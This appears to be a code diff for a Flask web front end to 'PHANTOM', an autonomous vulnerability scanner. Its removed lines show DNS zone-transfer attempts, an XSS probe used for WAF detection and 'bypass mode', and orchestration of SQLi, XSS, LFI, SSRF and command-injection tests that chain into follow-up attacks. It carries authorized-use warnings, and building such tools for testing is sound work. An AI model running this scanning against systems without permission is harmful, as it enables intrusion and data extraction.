-                    "remediation":  f.fix,
-                }
-                for f in self.state.findings
-            ],
-        }
-
-        with open(fname, "w") as fp:
-            json.dump(report, fp, indent=2, default=str)
-        return fname
+def run_scan(job: ScanJob) -> None:
+    try:
+        job.log(f"PHANTOM v{SCAN_VERSION} — Target: {job.url}", "INFO")
+        phase_osint(job)
+        phase_ports(job)
+        phase_spider(job)
+        phase_vulns(job)
+    except Exception as e:
+        job.log(f"Scanner error: {e}", "WARN")
+    finally:
+        job.done()
+        cnt = len(job.vulns)
+        job.log(f"SCAN COMPLETE — {cnt} issue{'s' if cnt!=1 else ''} found in {job.elapsed}s", "OK")
 
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  PHANTOM SCANNER (Main Orchestrator)
+#  HTML TEMPLATE
 # ══════════════════════════════════════════════════════════════════════════════
+HOME_HTML = r"""<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>PHANTOM v2.0 — Vulnerability Scanner</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{--bg:#080c10;--bg2:#0d1117;--bg3:#161b22;--border:#21262d;
+  --red:#f85149;--yellow:#d29922;--cyan:#58a6ff;--green:#3fb950;
+  --magenta:#bc8cff;--text:#e6edf3;--dim:#8b949e}
+body{font-family:'Segoe UI',system-ui,monospace;background:var(--bg);color:var(--text);min-height:100vh}
+::-webkit-scrollbar{width:4px}::-webkit-scrollbar-track{background:var(--bg2)}
+::-webkit-scrollbar-thumb{background:#30363d;border-radius:2px}
 
-class PhantomScanner:
-    """Top-level orchestrator — coordinates all phases and chain engine."""
+/* Header */
+.hdr{background:linear-gradient(180deg,#0d0d0d,var(--bg2));
+  border-bottom:1px solid #f8514930;padding:16px 28px;display:flex;align-items:center;gap:14px}
+.hdr-art{font-family:monospace;font-size:.55rem;line-height:1.1;color:var(--red)}
+.hdr-info h1{font-size:1.1rem;color:var(--red);font-weight:700;letter-spacing:.05em}
+.hdr-info p{font-size:.72rem;color:var(--dim)}
+.badge{display:inline-block;padding:2px 8px;border-radius:3px;font-size:.65rem;font-weight:700;margin-left:8px}
+.b-red{background:#f8514918;border:1px solid #f8514940;color:var(--red)}
+.b-cyan{background:#388bfd15;border:1px solid #388bfd40;color:var(--cyan)}
+.b-green{background:#3fb95015;border:1px solid #3fb95040;color:var(--green)}
 
-    def __init__(self, target: str):
-        self.target = target.rstrip("/")
-        parsed      = urlparse(target)
-        if not parsed.scheme:
-            self.target = "https://" + target
-            parsed      = urlparse(self.target)
-        self.host   = parsed.hostname or target
-        self.ui     = UIManager()
-        self.state  = ScanState(target=self.target, base_url=self.target)
-        self.ui.set_state(self.state)
+.wrap{max-width:1100px;margin:0 auto;padding:20px 14px}
 
-    def _phase0_recon(self) -> None:
-        """DNS, WHOIS, WAF fingerprint."""
-        self.ui.set_phase("Phase 0: Recon", 6)
-        self.ui.log("Starting DNS & OSINT recon...", "INFO")
+/* Alert */
+.alert{background:#d2992215;border:1px solid #d2992240;border-radius:8px;
+  padding:10px 16px;margin-bottom:14px;color:var(--yellow);font-size:.8rem}
 
-        # IP resolution
-        try:
-            ip = socket.gethostbyname(self.host)
-            self.ui.log(f"IP: {ip}", "OK")
-        except Exception:
-            self.ui.log("Could not resolve hostname", "WARN")
-        self.ui.advance_phase("Phase 0: Recon")
+/* Scan form */
+.scan-card{background:var(--bg3);border:1px solid var(--border);border-radius:12px;padding:24px;margin-bottom:16px}
+.scan-card h2{color:var(--text);font-size:1rem;margin-bottom:4px}
+.scan-card p{color:var(--dim);font-size:.8rem;margin-bottom:18px}
+.inp-row{display:grid;grid-template-columns:1fr;gap:10px;margin-bottom:12px}
+label{display:block;color:var(--dim);font-size:.73rem;margin-bottom:4px}
+input[type=text]{width:100%;background:var(--bg);border:1px solid #30363d;border-radius:8px;
+  padding:10px 14px;color:var(--text);font-size:.9rem;outline:none;transition:border-color .2s;font-family:monospace}
+input[type=text]:focus{border-color:var(--cyan)}
+.btn{background:linear-gradient(135deg,#b91c1c,#dc2626);border:none;color:#fff;
+  padding:12px 24px;border-radius:8px;cursor:pointer;font-size:.9rem;font-weight:700;
+  width:100%;transition:opacity .2s;margin-top:4px;letter-spacing:.05em}
+.btn:hover{opacity:.88}.btn:disabled{opacity:.4;cursor:not-allowed}
+.qt a{color:var(--cyan);font-size:.75rem;display:inline-block;margin:4px 6px 4px 0;text-decoration:none}
+.qt a:hover{text-decoration:underline}
 
-        # DNS records
-        if DNS_AVAILABLE:
-            for rtype in ["A", "MX", "NS", "TXT", "CNAME"]:
-                try:
-                    answers = dns.resolver.resolve(self.host, rtype)
-                    for rdata in answers:
-                        self.ui.log(f"DNS {rtype}: {rdata}", "OK")
-                except Exception:
-                    pass
-            # Zone transfer attempt
-            try:
-                ns_records = dns.resolver.resolve(self.host, "NS")
-                for ns in ns_records:
-                    z = dns.zone.from_xfr(dns.query.xfr(str(ns), self.host))
-                    if z:
-                        self.ui.log(f"ZONE TRANSFER SUCCESS from {ns}!", "VULN")
-                        self.state.add_finding(Finding(
-                            vuln_id="", type="DNS Zone Transfer",
-                            severity="HIGH", location=str(ns),
-                            evidence="AXFR returned zone data",
-                            cvss=7.5, owasp="A05:2021", cwe="CWE-200",
-                            impact="Full subdomain enumeration for attacker",
-                            fix=["Restrict zone transfers to authorised slave servers only"],
-                        ))
-            except Exception:
-                pass
-        self.ui.advance_phase("Phase 0: Recon")
+/* Progress area */
+#pa{display:none;margin-bottom:14px}
+.prog-card{background:var(--bg3);border:1px solid var(--border);border-radius:12px;padding:16px 20px;margin-bottom:12px}
+.prog-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
+.prog-label{color:var(--text);font-size:.88rem;font-weight:600}
+.prog-pct{color:var(--cyan);font-size:1.1rem;font-weight:700}
+.prog-track{background:#21262d;border-radius:99px;height:6px;overflow:hidden}
+.prog-bar{background:linear-gradient(90deg,var(--red),var(--magenta),var(--cyan));height:100%;
+  border-radius:99px;transition:width .4s ease;width:0%}
+.prog-mod{color:var(--dim);font-size:.75rem;margin-top:6px}
+.phases{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:10px}
+@media(max-width:600px){.phases{grid-template-columns:1fr}}
+.ph-item{background:var(--bg);border-radius:8px;padding:8px 12px;border:1px solid var(--border)}
+.ph-name{color:var(--dim);font-size:.72rem;margin-bottom:4px}
+.ph-bar-track{background:#21262d;border-radius:99px;height:4px}
+.ph-bar{height:100%;border-radius:99px;transition:width .4s;background:var(--green)}
+.ph-bar.active{background:var(--cyan)}
 
-        # WHOIS
-        if WHOIS_AVAILABLE:
-            try:
-                w = whois_lib.whois(self.host)
-                self.ui.log(f"Registrar: {w.registrar}", "OK")
-            except Exception:
-                pass
-        self.ui.advance_phase("Phase 0: Recon")
+/* Terminal */
+.term{background:#010409;border:1px solid var(--border);border-radius:10px;padding:12px 14px;
+  height:240px;overflow-y:auto;font-family:'Courier New',monospace;font-size:.72rem;scroll-behavior:smooth}
+.ll{padding:1px 0;display:flex;gap:8px;line-height:1.45}
+.lt{color:#30363d;flex-shrink:0}
+.INFO{color:var(--dim)}.OK{color:var(--green)}.VULN{color:var(--red);font-weight:700}
+.WARN{color:var(--yellow)}.CHAIN{color:var(--magenta);font-weight:700}
 
-        # WAF detection
-        test_resp = None
-        try:
-            test_resp = requests.get(
-                self.target + "/?q=<script>alert(1)</script>",
-                headers={"User-Agent": USER_AGENTS[0]},
-                timeout=10, verify=False
-            )
-        except Exception:
-            pass
-        if test_resp:
-            h_str = str(test_resp.headers).lower()
-            waf   = None
-            if "cloudflare" in h_str:          waf = "Cloudflare"
-            elif "x-sucuri-id" in h_str:       waf = "Sucuri WAF"
-            elif "x-fw-hash" in h_str:         waf = "Unknown FW"
-            elif "incapsula" in h_str:         waf = "Incapsula"
-            elif "x-amzn-requestid" in h_str:  waf = "AWS WAF"
-            elif test_resp.status_code in (403, 406, 429): waf = "Unknown WAF"
-            if waf:
-                self.state.waf_detected = waf
-                self.ui.log(f"WAF detected: {waf} — enabling bypass mode", "WARN")
-            else:
-                self.ui.log("No WAF detected", "OK")
-        self.ui.advance_phase("Phase 0: Recon")
+/* Severity cards */
+#sev{display:none;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:14px}
+.sc{background:var(--bg3);border-radius:10px;padding:12px 14px;text-align:center;border:1px solid var(--border)}
+.sn{font-size:1.6rem;font-weight:700;margin-bottom:2px}.sl{font-size:.68rem;color:var(--dim);font-weight:600}
+.C .sn{color:var(--red)}.H .sn{color:var(--yellow)}.M .sn{color:var(--cyan)}.L .sn{color:var(--green)}
 
-    def _phase1_ports(self) -> None:
-        scanner = PortScanner(self.host, self.ui)
-        scanner.run(self.state)
+/* Port grid */
+#port-sec{display:none}
+.port-card{background:var(--bg3);border:1px solid var(--border);border-radius:12px;padding:16px 20px;margin-bottom:14px}
+.port-card h3{color:var(--cyan);font-size:.88rem;margin-bottom:10px}
+.port-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(145px,1fr));gap:7px}
+.pch{background:var(--bg);border-radius:7px;padding:7px 11px;border:1px solid var(--border)}
+.pch.d{border-color:#f8514940}.pn{color:var(--text);font-weight:700;font-size:.88rem}
+.ps{color:var(--dim);font-size:.7rem}
 
-    def _phase2_spider(self) -> None:
-        crawler = WebCrawler(self.base_url, self.ui)
-        crawler.run(self.state)
-        self._crawler_ref = crawler
+/* Chain events */
+#chain-sec{display:none}
+.chain-card{background:var(--bg3);border:1px solid #bc8cff30;border-radius:12px;padding:14px 18px;margin-bottom:14px}
+.chain-card h3{color:var(--magenta);font-size:.88rem;margin-bottom:10px}
+.chain-item{display:flex;gap:10px;margin-bottom:6px;font-size:.76rem}
+.chain-ts{color:var(--dim);flex-shrink:0}
+.chain-msg{color:var(--magenta)}
 
-    def _phase3_vulns(self) -> None:
-        """Run all 12 vulnerability modules across all discovered URLs."""
-        ve = VulnEngine(self.base_url, self.ui, self.state)
-        ce = ChainEngine(ve, getattr(self, "_crawler_ref", None), self.state, self.ui)
+/* Results */
+#ra{display:none}
+.res-head{background:var(--bg3);border:1px solid var(--border);border-radius:12px;
+  padding:16px 20px;margin-bottom:14px;display:flex;justify-content:space-between;align-items:center}
+.res-cnt{font-size:1.1rem;font-weight:700;color:var(--text)}
+.res-sub{color:var(--dim);font-size:.76rem;margin-top:2px}
+.rb{padding:5px 14px;border-radius:20px;font-size:.82rem;font-weight:700}
+.rC{background:#f8514920;color:var(--red);border:1px solid #f8514960}
+.rH{background:#d2992218;color:var(--yellow);border:1px solid #d2992260}
+.rM{background:#388bfd15;color:var(--cyan);border:1px solid #388bfd50}
+.rL{background:#3fb95015;color:var(--green);border:1px solid #3fb95060}
+.vl{display:grid;gap:9px;margin-bottom:16px}
+.vc{background:var(--bg3);border-radius:10px;padding:13px 16px;border:1px solid var(--border);border-left:3px solid transparent}
+.vc.sC{border-left-color:var(--red)}.vc.sH{border-left-color:var(--yellow)}
+.vc.sM{border-left-color:var(--cyan)}.vc.sL{border-left-color:var(--green)}
+.vh{display:flex;align-items:center;gap:8px;margin-bottom:5px}
+.vs{padding:2px 7px;border-radius:4px;font-size:.67rem;font-weight:700}
+.vt{color:var(--text);font-size:.87rem;font-weight:600}
+.vcvss{color:var(--dim);font-size:.72rem;margin-left:auto}
+.vd{color:var(--dim);font-size:.76rem;font-family:monospace;margin-bottom:5px}
+.vpay{color:#79c0ff;font-size:.72rem;font-family:monospace;margin-bottom:4px}
+.vext{background:var(--bg);border-radius:6px;padding:7px 10px;color:var(--green);
+  font-size:.71rem;font-family:monospace;margin-bottom:5px;border:1px solid #30363d}
+.vimp{color:var(--yellow);font-size:.75rem;margin-bottom:5px}
+.ftb{background:none;border:none;color:var(--cyan);font-size:.72rem;cursor:pointer;padding:0}
+.fd{display:none;background:var(--bg);border-radius:6px;padding:8px 10px;
+  margin-top:5px;color:#79c0ff;font-size:.72rem;border:1px solid var(--border)}
+.fd ol{padding-left:14px}.fd li{margin-bottom:3px;color:var(--green)}
+.nv{text-align:center;padding:24px;background:var(--bg3);border:1px solid var(--border);
+  border-radius:12px;color:var(--green);font-size:.9rem}
+.bna{background:var(--bg3);border:1px solid var(--border);color:var(--text);
+  padding:8px 18px;border-radius:8px;cursor:pointer;font-size:.8rem;text-decoration:none;display:inline-block;margin-top:10px}
+.dlb{background:var(--bg);border:1px solid var(--border);color:var(--cyan);
+  padding:6px 14px;border-radius:8px;cursor:pointer;font-size:.76rem;float:right}
+</style>
+</head>
+<body>
+<div class="hdr">
+  <pre class="hdr-art">██████╗ ██╗  ██╗ █████╗
+██╔══██╗██║  ██║██╔══██╗
+██████╔╝███████║███████║
+██╔═══╝ ██╔══██║██╔══██║
+██║     ██║  ██║██║  ██║
+╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝</pre>
+  <div class="hdr-info">
+    <h1>PHANTOM <span class="badge b-red">v2.0</span><span class="badge b-cyan">AUTONOMOUS</span><span class="badge b-green">IIT KANPUR PORTFOLIO</span></h1>
+    <p>Persistent Heuristic Attack &amp; Network Threat Observation Machine</p>
+    <p style="margin-top:3px;color:#f8514980;font-size:.7rem">⚠ Authorized targets and CTF/lab environments ONLY</p>
+  </div>
+</div>
 
-        all_urls = list(self.state.discovered_urls) or [self.base_url]
-        total    = len(all_urls) * 7 + 6  # rough task estimate
-        self.ui.set_phase("Phase 3: Vulns", total)
+<div class="wrap">
+  <div class="alert">
+    ⚠️ This tool is for <strong>authorized penetration testing</strong> only.
+    Unauthorized scanning violates IT Act 2000, Section 66. Always obtain written permission.
+  </div>
 
-        # Scan each URL for injection, LFI, SSRF, IDOR, redirect
-        with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
-            def scan_url(url: str) -> None:
-                ve.test_sqli(url)
-                ve.test_xss(url)
-                ve.test_lfi(url)
-                ve.test_ssrf(url)
-                ve.test_cmdi(url)
-                ve.test_idor(url)
-                ve.test_open_redirect(url)
-                ve.scan_response_for_secrets(url)
-                self.ui.advance_phase("Phase 3: Vulns", 7)
+  <!-- FORM -->
+  <div id="fa">
+    <div class="scan-card">
+      <h2>Launch Autonomous Vulnerability Scan</h2>
+      <p>PHANTOM runs 4 phases automatically: OSINT → Port Scan → Recursive Spider → 12 Vuln Modules.
+         Each finding chains into follow-up attacks autonomously.</p>
+      <div class="inp-row">
+        <div>
+          <label>Target URL</label>
+          <input type="text" id="iu" value="http://testphp.vulnweb.com/" placeholder="https://your-authorized-target.com">
+        </div>
+      </div>
+      <button class="btn" id="sb" onclick="go()">⚡ LAUNCH PHANTOM SCAN</button>
+      <div class="qt" style="margin-top:12px">
+        <span style="color:var(--dim);font-size:.73rem">Legal targets: </span>
+        <a href="#" onclick="su('http://testphp.vulnweb.com/')">testphp.vulnweb.com</a>
+        <a href="#" onclick="su('http://demo.testfire.net/')">demo.testfire.net</a>
+        <a href="#" onclick="su('http://testphp.vulnweb.com/listproducts.php?cat=1')">SQLi test page</a>
+        <a href="#" onclick="su('http://testphp.vulnweb.com/artists.php?artist=1')">artists.php</a>
+      </div>
+    </div>
+  </div>
 
-            futures = [ex.submit(scan_url, url) for url in all_urls]
-            for fut in as_completed(futures):
-                try:
-                    fut.result()
-                except Exception:
-                    pass
+  <!-- PROGRESS -->
+  <div id="pa">
+    <div class="prog-card">
+      <div class="prog-top">
+        <span class="prog-label" id="plabel">Initializing PHANTOM...</span>
+        <span class="prog-pct" id="ppct">0%</span>
+      </div>
+      <div class="prog-track"><div class="prog-bar" id="pbar"></div></div>
+      <div class="prog-mod" id="pmod">Starting...</div>
+      <div class="phases" id="phases-grid"></div>
+    </div>
+    <div class="term" id="term"></div>
+  </div>
 
-        # Form-based testing
-        ve.test_sqli_forms()
-        ve.test_xss_forms()
-        self.ui.advance_phase("Phase 3: Vulns", 1)
+  <!-- SEVERITY -->
+  <div id="sev" style="display:none">
+    <div class="sc C"><div class="sn" id="sC">0</div><div class="sl">CRITICAL</div></div>
+    <div class="sc H"><div class="sn" id="sH">0</div><div class="sl">HIGH</div></div>
+    <div class="sc M"><div class="sn" id="sM">0</div><div class="sl">MEDIUM</div></div>
+    <div class="sc L"><div class="sn" id="sL">0</div><div class="sl">LOW</div></div>
+  </div>
 
-        # Site-wide checks (run once)
-        ve.test_cors()
-        self.ui.advance_phase("Phase 3: Vulns", 1)
-        ve.test_headers()
-        self.ui.advance_phase("Phase 3: Vulns", 1)
-        ve.test_session_cookies()
-        self.ui.advance_phase("Phase 3: Vulns", 1)
-        ve.test_sensitive_files()
-        self.ui.advance_phase("Phase 3: Vulns", 1)
-        ve.test_clickjacking()
-     
+  <!-- PORTS -->
+  <div id="port-sec">
+    <div class="port-card">
+      <h3>🔌 Open Ports &amp; Services</h3>
+      <div class="port-grid" id="pg"></div>
+    </div>
+  </div>
+
+  <!-- CHAIN EVENTS -->
+  <div id="chain-sec">
+    <div class="chain-card">
+      <h3>⛓ Chain Engine Events</h3>
+      <div id="chain-list"></div>
+    </div>
+  </div>
+
+  <!-- RESULTS -->
+  <div id="ra">
+    <div class="res-head">
+      <div>
+        <div class="res-cnt" id="rcnt">—</div>
+        <div class="res-sub" id="rtgt"></div>
+        <div class="res-sub" id="rtime"></div>
+      </div>
+      <div class="rb rL" id="rb">—</div>
+    </div>
+    <div class="vl" id="vl"></div>
+    <a href="/" class="bna">← New Scan</a>
+    <a href="#" class="dlb" id="dlbtn">⬇ Download JSON Report</a>
+  </div>
+</div>
+
+<script>
+let sid=null,poller=null,li=0,etimer=null,es=0,lastD=null;
+const SC={CRITICAL:'#f85149',HIGH:'#d29922',MEDIUM:'#58a6ff',LOW:'#3fb950'};
+const SBG={CRITICAL:'#f8514920',HIGH:'#d2992218',MEDIUM:'#388bfd15',LOW:'#3fb95018'};
+const SK={CRITICAL:'sC',HIGH:'sH',MEDIUM:'sM',LOW:'sL'};
+const RK={CRITICAL:'rC',HIGH:'rH',MEDIUM:'rM',LOW:'rL'};
+const PHASES=['Phase 0: OSINT','Phase 1: Ports','Phase 2: Spider','Phase 3: Vulns'];
+
+function su(u){document.getElementById('iu').value=u;return false}
+
+async function go(){
+  const url=document.getElementById('iu').value.trim();
+  if(!url){alert('Enter a target URL');return}
+  document.getElementById('sb').disabled=true;
+  document.getElementById('sb').textContent='⚡ SCANNING...';
+  document.getElementById('fa').style.display='none';
+  document.getElementById('pa').style.display='block';
+  document.getElementById('term').innerHTML='';
+  li=0;es=0;
+
+  // Build phase bars
+  const pg=document.getElementById('phases-grid');
+  pg.innerHTML='';
+  PHASES.forEach(p=>{
+    const d=document.createElement('div');d.className='ph-item';d.id='ph-'+p.replace(/\W/g,'');
+    d.innerHTML='<div class="ph-name">'+p+'</div><div class="ph-bar-track"><div class="ph-bar" id="phb-'+p.replace(/\W/g,'')+'"></div></div>';
+    pg.appendChild(d);
+  });
+
+  etimer=setInterval(()=>{es++;document.getElementById('pmod').textContent=`${es}s elapsed — scanning...`},1000);
+  const fd=new FormData();fd.append('url',url);
+  const r=await fetch('/scan',{method:'POST',body:fd});
+  const d=await r.json();sid=d.scan_id;
+  document.getElementById('rtgt').textContent=url;
+  poller=setInterval(tick,1800);tick();
+}
+
+async function tick(){
+  if(!sid)return;
+  try{
+    const r=await fetch('/api/status/'+sid);const d=await r.json();lastD=d;
+    upTerm(d.logs||[]);
+    document.getElementById('pbar').style.width=(d.progress||0)+'%';
+    document.getElementById('ppct').textContent=(d.progress||0)+'%';
+    document.getElementById('plabel').textContent=d.current_phase||'Running...';
+    // Phase bars
+    const pp=d.phase_prog||{};
+    PHASES.forEach(p=>{
+      const info=pp[p]||{done:0,total:1};
+      const pct=Math.round((info.done/Math.max(info.total,1))*100);
+      const bar=document.getElementById('phb-'+p.replace(/\W/g,''));
+      if(bar)bar.style.width=pct+'%';
+    });
+    // Ports
+    const ports=d.ports||[];
+    if(ports.length>0){
+      document.getElementById('port-sec').style.display='block';
+      const pg=document.getElementById('pg');pg.innerHTML='';
+      ports.forEach(p=>{
+        const isDanger=[6379,9200,27017,11211,23,8888].includes(p.port);
+        const c=document.createElement('div');c.className='pch'+(isDanger?' d':'');
+        c.innerHTML='<div class="pn">'+p.port+' <span class="ps">'+p.service+'</span></div>'+
+          (p.version?'<div class="ps">'+esc(p.version.substring(0,35))+'</div>':'')+
+          (isDanger?'<div class="ps" style="color:#f85149;font-size:.65rem">⚠ Dangerous</div>':'');
+        pg.appendChild(c);
+      });
+    }
+    // Chains
+    const chains=d.chains||[];
+    if(chains.length>0){
+      document.getElementById('chain-sec').style.display='block';
+      const cl=document.getElementById('chain-list');cl.innerHTML='';
+      chains.slice(-8).forEach(c=>{
+        const div=document.createElement('div');div.className='chain-item';
+        div.innerHTML='<span class="chain-ts">['+c.ts+']</span><span class="chain-msg">'+esc(c.msg)+'</span>';
+        cl.appendChild(div);
+      });
+    }
+    if(d.status==='done'){clearInterval(poller);clearInterval(etimer);upTerm(d.logs||[]);showRes(d);}
+  }catch(e){console.error(e)}
+}
+
+function upTerm(logs){
+  const t=document.getElementById('term');
+  logs.slice(li).forEach(l=>{
+    const d=document.createElement('div');d.className='ll';
+    d.innerHTML='<span class="lt">['+l.ts+']</span><span class="'+l.level+'">'+esc(l.msg)+'</span>';
+    t.appendChild(d);li++;
+  });t.scrollTop=t.scrollHeight;
+}
+
+function showRes(d){
+  const vs=d.vulns||[];const cnt=vs.length;
+  const counts={CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0};
+  vs.forEach(v=>counts[v.severity]=(counts[v.severity]||0)+1);
+  ['CRITICAL','HIGH','MEDIUM','LOW'].forEach(s=>document.getElementById('s'+s[0]).textContent=counts[s]);
+  document.getElementById('sev').style.display='grid';
+  let risk='LOW';
+  if(counts.CRITICAL>0)risk='CRITICAL';else if(counts.HIGH>0)risk='HIGH';else if(counts.MEDIUM>0)risk='MEDIUM';
+  document.getElementById('ra').style.display='block';
+  document.getElementById('rcnt').textContent=cnt===0?'✓ No Vulnerabilities Found':`${cnt} Vulnerabilit${cnt===1?'y':'ies'} Found`;
+  document.getElementById('rtime').textContent=`Completed in ${d.elapsed}s | ${(d.urls_count||0)} URLs | ${(d.ports_count||0)} ports`;
+  const rb=document.getElementById('rb');rb.textContent=risk;rb.className='rb '+RK[risk];
+  const ord={CRITICAL:0,HIGH:1,MEDIUM:2,LOW:3};
+  vs.sort((a,b)=>(ord[a.severity]||4)-(ord[b.severity]||4));
+  const vl=document.getElementById('vl');vl.innerHTML='';
+  if(cnt===0){
+    vl.innerHTML='<div class="nv">✅ No vulnerabilities detected. Site appears secure for these test cases.</div>';
+  }else{
+    vs.forEach((v,i)=>{
+      const s=v.severity||'MEDIUM';const fi='f'+i;
+      const c=document.createElement('div');c.className='vc '+SK[s];
+      let html='<div class="vh"><span class="vs" style="background:'+SBG[s]+';color:'+SC[s]+'">'+s+'</span><span class="vt">'+esc(v.type)+'</span>';
+      if(v.cvss)html+='<span class="vcvss">CVSS '+v.cvss+'</span>';
+      html+='</div><div class="vd">'+esc(v.location);
+      if(v.parameter)html+=' · param: <strong>'+esc(v.parameter)+'</strong>';
+      html+='</div>';
+      if(v.payload)html+='<div class="vpay">Payload: '+esc(v.payload)+'</div>';
+      if(v.evidence)html+='<div class="vd">'+esc(v.evidence)+'</div>';
+      if(v.extracted&&Object.keys(v.extracted).length)
+        html+='<div class="vext">★ EXTRACTED: '+esc(JSON.stringify(v.extracted).substring(0,180))+'</div>';
+      if(v.impact)html+='<div class="vimp">⚡ '+esc(v.impact)+'</div>';
+      html+='<button class="ftb" onclick="tf(\''+fi+'\')">▸ Remediation Steps</button>';
+      if(v.fix&&v.fix.length){
+        html+='<div class="fd" id="'+fi+'"><ol>';
+        v.fix.forEach(step=>html+='<li>'+esc(step)+'</li>');
+        html+='</ol></div>';
+      }
+      c.innerHTML=html;vl.appendChild(c);
+    });
+  }
+  document.getElementById('dlbtn').onclick=()=>{
+    const b=new Blob([JSON.stringify(d,null,2)],{type:'application/json'});
+    const a=document.createElement('a');a.href=URL.createObjectURL(b);
+    a.download='phantom_report_'+sid+'.json';a.click();return false;
+  };
+}
+function tf(id){const e=document.getElementById(id);e.style.display=e.style.display==='block'?'none':'block';}
+function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+</script>
+</body>
+</html>"""
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  FLASK ROUTES
+# ══════════════════════════════════════════════════════════════════════════════
+@app.route("/")
+def home(): return HOME_HTML
+
+@app.route("/scan", methods=["POST"])
+def start_scan():
+    url = request.form.get("url","").strip()
+    if not url: return jsonify({"error":"URL required"}), 400
+    if not url.startswith(("http://","https://")): url = "https://" + url
+    job = ScanJob(url)
+    scans[job.id] = job
+    threading.Thread(target=run_scan, args=(job,), daemon=True).start()
+    return jsonify({"scan_id": job.id})
+
+@app.route("/api/status/<scan_id>")
+def status(scan_id):
+    job = scans.get(scan_id)
+    if not job: return jsonify({"error":"Not found"}), 404
+    with job._lock:
+        logs   = list(job.logs)
+        vulns  = list(job.vulns)
+        ports  = list(job.ports)
+        chains = list(job.chains)
+        pp     = {k: dict(v) for k,v in job.phase_prog.items()}
+    return jsonify({
+        "status":        job.status,
+        "logs":          logs,
+        "vulns":         vulns,
+        "ports":         ports,
+        "chains":        chains,
+        "progress":      job.progress,
+        "current_phase": job.current_phase,
+        "phase_prog":    pp,
+        "waf":           job.waf,
+        "elapsed":       round(time.time()-job.start,1) if job.status=="running" else job.elapsed,
+        "urls_count":    len(job.urls),
+        "ports_count":   len(job.ports),
+        "secrets":       job.secrets,
+    })
+
+@app.route("/health")
+def health():
+    return jsonify({"status":"ok","active":sum(1 for s in scans.values() if s.status=="running")})
+
+if __name__ == "__main__":
+    print(f"[*] PHANTOM v{SCAN_VERSION} web interface on port {PORT}")
+    print(f"[*] Open: http://localhost:{PORT}")
+    app.run(host="0.0.0.0", port=PORT, debug=False, threaded=True)
+
